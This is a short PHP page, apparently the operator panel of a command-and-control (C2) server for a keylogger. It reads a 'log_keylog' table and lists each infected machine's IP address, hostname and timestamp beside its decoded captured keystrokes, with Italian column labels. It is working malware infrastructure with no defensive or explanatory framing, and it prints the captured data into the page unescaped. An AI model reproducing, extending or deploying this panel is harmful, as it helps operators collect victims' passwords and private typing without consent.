
<?php

include 'conf.php';
include 'db.php';

?>

<html>

<head>
<title>.:: <?php echo $title; ?> ::.</title>
<link rel="stylesheet" href="main.css">
</head>

<body>
<table id="main" width="100%" cellpadding="1" cellspacing="1">
<tr>
	<td colspan="4" align="center"><h3>C2</h3></td>
</tr>

<tr>
	<td align="center">Indirizzo IP</td>
	<td align="center">Hostname</td>
	<td align="center">Timestamp</td>
    <td align="center">Keylogger</td>

</tr>
<tr>
	<td colspan="4">&nbsp;</td> 
</tr>

<?php


$sql = "SELECT * FROM c2.log_keylog order by timestamp DESC";
$result = $conn->query($sql);



if ($result->num_rows > 0) {
	
	
  while($row = $result->fetch_assoc()) {	
  
  
  	$b = $row["b64"];
    $data = base64_decode($b);
	
	echo "<tr><td>" . $row["ip_address"] . "</td><td>" . $row["hostname"] . "</td><td>". $row["timestamp"] . "</td><td>" . $data . "</td></tr>";
  
  
  
  
  }
} 



 
?>


<tr>
	<td colspan="4">Record number: <?php echo $result->num_rows; ?>&nbsp;|&nbsp;<a href="key.php">Update</a>&nbsp;|&nbsp;<a href="index.php">Home</a></td>
</tr>



</table>
</body>
</html>